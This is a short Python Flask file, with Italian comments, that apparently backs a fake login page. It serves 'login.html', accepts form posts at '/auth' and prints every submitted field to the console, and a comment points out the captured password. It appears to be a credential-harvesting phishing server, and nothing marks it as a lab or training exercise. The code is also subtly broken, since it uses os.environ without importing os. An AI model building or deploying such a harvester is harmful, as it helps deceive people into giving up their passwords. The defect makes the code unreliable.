from flask import Flask, send_file, make_response

app = Flask(__name__)

@app.route("/")
def index():
    # Restituisce subito login.html con status 200
    response = make_response(send_file("login.html"))
    response.status_code = 200
    return response

@app.route("/auth", methods=["POST"])
def auth():
    from flask import request
    data = request.form.to_dict()
    print(data)  # qui vedi la password nella console
    return "ok", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
